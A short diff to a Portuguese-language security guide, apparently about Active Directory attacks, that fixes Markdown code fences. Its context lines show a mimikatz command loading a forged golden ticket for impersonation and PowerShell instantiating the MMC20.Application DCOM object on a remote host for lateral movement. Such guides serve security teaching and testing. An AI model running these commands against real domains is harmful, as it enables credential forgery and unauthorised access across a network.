@@ -61,7 +61,8 @@ permissão.
 Personificando golden ticket 
 ```powershell
 PS> mimikatz.exe "kerberos::ptt C:\Tickets\gold.kirbi"
-* File: 'C:\Tickets\gold.kirbi': OK```
+* File: 'C:\Tickets\gold.kirbi': OK
+```
 
 Com o ticket carregado na memória (personificado), você pode utilizar o próprio 
 PowerShell para interagir localmente ou remotamente com algum componente, para
@@ -76,6 +77,7 @@ conexão com ela, podemos listar as funções da interface e usar e abusar delas
 o servidor.
 
 Realizando a conexão com a DCOM remotamente e listando suas funções
+
 ```PowerShell
 PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.1.10"))
 PS> $dcom.Document.ActiveView | Get-Member
